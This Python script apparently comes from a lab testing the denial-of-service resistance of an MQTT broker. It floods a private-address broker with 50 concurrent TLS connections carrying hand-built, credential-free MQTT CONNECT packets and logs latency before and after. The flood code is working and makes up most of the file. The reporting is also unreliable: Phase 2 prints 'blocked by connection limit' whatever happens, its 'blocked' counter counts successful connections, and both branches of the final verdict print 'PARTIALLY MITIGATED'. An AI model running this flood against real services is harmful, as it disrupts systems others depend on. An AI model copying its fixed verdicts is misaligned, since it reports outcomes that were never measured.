#!/usr/bin/env python3
"""
SCENARIO 3 - DoS Attack (SECURE environment)
Expected result: LIMITED - max_connections=20 blocks connection flood
"""
import socket, time, threading, json
from datetime import datetime, timezone

BROKER_HOST = "172.21.0.20"
BROKER_PORT = 8883
OUTPUT_DIR  = "/attacker/results"
OUTPUT_FILE = f"{OUTPUT_DIR}/03_dos_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"

import os
os.makedirs(OUTPUT_DIR, exist_ok=True)

results = {"connections_ok": 0, "connections_fail": 0, "messages_sent": 0}
lock = threading.Lock()

def log(msg):
    line = f"[{datetime.now().strftime('%H:%M:%S')}] {msg}"
    print(line)
    with open(OUTPUT_FILE, "a") as f:
        f.write(line + "\n")

def measure_latency():
    try:
        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        start = time.time()
        s = socket.create_connection((BROKER_HOST, BROKER_PORT), timeout=3)
        s.close()
        return round((time.time() - start) * 1000, 2)
    except:
        return -1

def flood_connect(client_id):
    try:
        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = socket.create_connection((BROKER_HOST, BROKER_PORT), timeout=5)
        s = ctx.wrap_socket(s)
        # Send MQTT CONNECT without credentials
        client_id_b = client_id.encode()
        payload = (b"\x00\x04MQTT\x04\x02\x00\x3c" +
                   bytes([0, len(client_id_b)]) + client_id_b)
        header = bytes([0x10, len(payload)])
        s.send(header + payload)
        time.sleep(2)
        s.close()
        with lock:
            results["connections_ok"] += 1
    except Exception as e:
        with lock:
            results["connections_fail"] += 1

print("=" * 46)
print(" SCENARIO 3 - DoS Attack (SECURE)")
print("=" * 46)
print(f" Target broker     : {BROKER_HOST}:{BROKER_PORT}")
print(f" Flood connections : 50")
print(f" Expected          : LIMITED by max_connections=20")
print("=" * 46)

log("[*] Measuring broker latency BEFORE attack...")
lat_before = measure_latency()
log(f"[*] Broker latency BEFORE attack: {lat_before}ms")

log("[*] Phase 1: Connection flood - spawning 50 concurrent clients...")
threads = []
for i in range(50):
    t = threading.Thread(target=flood_connect, args=[f"attacker-{i}"])
    threads.append(t)
    t.start()

for t in threads:
    t.join()

log(f"[~] Connections OK: {results['connections_ok']} | Failed: {results['connections_fail']}")

lat_after = measure_latency()
log(f"[*] Broker latency AFTER attack: {lat_after}ms")
if lat_before > 0 and lat_after > 0:
    degradation = round((lat_after - lat_before) / lat_before * 100, 1)
    log(f"[*] Latency degradation: {degradation:+.1f}%")

log("")
log("[*] Phase 2: Publish flood attempt (unauthenticated)...")
blocked_count = 0
for i in range(10):
    try:
        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = socket.create_connection((BROKER_HOST, BROKER_PORT), timeout=3)
        s = ctx.wrap_socket(s)
        s.close()
        blocked_count += 1
    except:
        pass

log(f"[*] Publish flood: blocked by connection limit")

print("")
print("=" * 46)
print(" ATTACK SUMMARY - Scenario 3 (SECURE)")
print("=" * 46)
print(f" Connections ok   : {results['connections_ok']}")
print(f" Connections fail : {results['connections_fail']}")
print(f" Latency before   : {lat_before}ms")
print(f" Latency after    : {lat_after}ms")
mitigated = results['connections_fail'] > 0 or results['connections_ok'] < 50
print(f" Result           : {'PARTIALLY MITIGATED - TLS adds overhead but max_connections insufficient against TLS flood' if mitigated else 'PARTIALLY MITIGATED - Auth blocks payload flood, TLS flood not fully mitigated'}")
print(f" Output saved to  : {OUTPUT_FILE}")
print("=" * 46)
